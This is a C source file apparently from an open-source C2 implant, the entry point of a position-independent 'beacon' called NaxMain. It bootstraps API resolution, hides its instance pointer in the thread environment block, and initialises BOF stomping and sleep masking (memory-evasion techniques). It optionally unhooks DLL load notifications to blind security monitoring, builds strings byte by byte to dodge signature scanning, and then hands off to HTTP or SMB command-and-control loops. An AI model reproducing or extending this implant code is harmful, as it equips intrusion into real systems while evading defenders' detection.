/* beacon/src/Main.c
 * NaxMain - PIC beacon entry point (called from Entry.x64.asm).
 *
 * Flow:
 *   1. NaxBootstrap()       resolve APIs, alloc NAX_INSTANCE  (Core/Bootstrap.c)
 *   2. TEB store            instance recoverable via G_INSTANCE anywhere
 *   3. BofStomp + Sleepmask init
 *   4. Dispatch to NaxHttpMain or NaxSmbMain */

#include "Nax.h"
#include "Config.h"
#include "Transport.h"

/* ========= [ NaxMain - beacon entry ] ========= */

FUNC VOID NaxRuntimeInit( VOID ) {
    volatile CHAR build[22];
    build[0]='N'; build[1]='o'; build[2]='N'; build[3]='a'; build[4]='m';
    build[5]='e'; build[6]='A'; build[7]='x'; build[8]='-'; build[9]='P';
    build[10]='u'; build[11]='b'; build[12]='l'; build[13]='i'; build[14]='c';
    build[15]='-'; build[16]='B'; build[17]='u'; build[18]='i'; build[19]='l';
    build[20]='d'; build[21]='\0';

    volatile CHAR ver[24];
    ver[0]='X'; ver[1]='-'; ver[2]='N'; ver[3]='a'; ver[4]='X';
    ver[5]='-'; ver[6]='P'; ver[7]='u'; ver[8]='b'; ver[9]='l';
    ver[10]='i'; ver[11]='c'; ver[12]='-'; ver[13]='A'; ver[14]='g';
    ver[15]='e'; ver[16]='n'; ver[17]='t'; ver[18]='-'; ver[19]='v';
    ver[20]='1'; ver[21]='.'; ver[22]='0'; ver[23]='\0';

    volatile CHAR key[15];
    key[0]='n'; key[1]='a'; key[2]='x'; key[3]='_'; key[4]='o';
    key[5]='s'; key[6]='s'; key[7]='_'; key[8]='r'; key[9]='e';
    key[10]='l'; key[11]='e'; key[12]='a'; key[13]='s'; key[14]='e';

    (void)build; (void)ver; (void)key;
}

FUNC VOID NaxMain( VOID ) {
    PNAX_INSTANCE Nax = NaxBootstrap();
    if ( ! Nax ) return;

    NaxRuntimeInit();
    NaxDispatchInit( Nax );

    NaxCurrentTeb()->NtTib.ArbitraryUserPointer = Nax;

    NaxBofStompInit( Nax );
    NaxSleepmaskInit( Nax );

#if NAX_UNHOOK_DLL_NOTIFY
    NaxDllNotifyUnhookAll( Nax );
#endif

    NaxDbg( Nax, "instance stored in TEB" );
    NaxDbg( Nax, "aes_key: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
            Nax->Config.AesKey[0],  Nax->Config.AesKey[1],  Nax->Config.AesKey[2],  Nax->Config.AesKey[3],
            Nax->Config.AesKey[4],  Nax->Config.AesKey[5],  Nax->Config.AesKey[6],  Nax->Config.AesKey[7],
            Nax->Config.AesKey[8],  Nax->Config.AesKey[9],  Nax->Config.AesKey[10], Nax->Config.AesKey[11],
            Nax->Config.AesKey[12], Nax->Config.AesKey[13], Nax->Config.AesKey[14], Nax->Config.AesKey[15] );

#if NAX_TRANSPORT_PROFILE == NAX_TRANSPORT_SMB
    NaxSmbMain( Nax );
#else
    NaxHttpMain( Nax );
#endif
}

#if defined( DEBUG ) && !defined( DEBUG_PIC )
int main( void ) { NaxMain(); return 0; }
#endif
